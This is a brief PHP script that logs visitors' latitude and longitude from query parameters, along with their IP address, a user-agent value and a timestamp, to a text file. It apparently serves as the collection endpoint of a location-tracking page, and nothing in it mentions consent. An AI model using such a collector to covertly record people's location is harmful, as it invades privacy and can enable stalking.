<?php

$myfile = fopen("location.txt", "a");
$txt ="\n" . date("d/m/y") . "\t" . date("H:i:s") . " GMT" . "\nlat, long: " . $_GET["lat"] . ", " . $_GET["long"] . "\nip: " . $_SERVER["REMOTE_ADDR"] . "\nuser_agent: " . $_GET["os"] . "\n";
fwrite($myfile, $txt);
fclose($myfile);

?>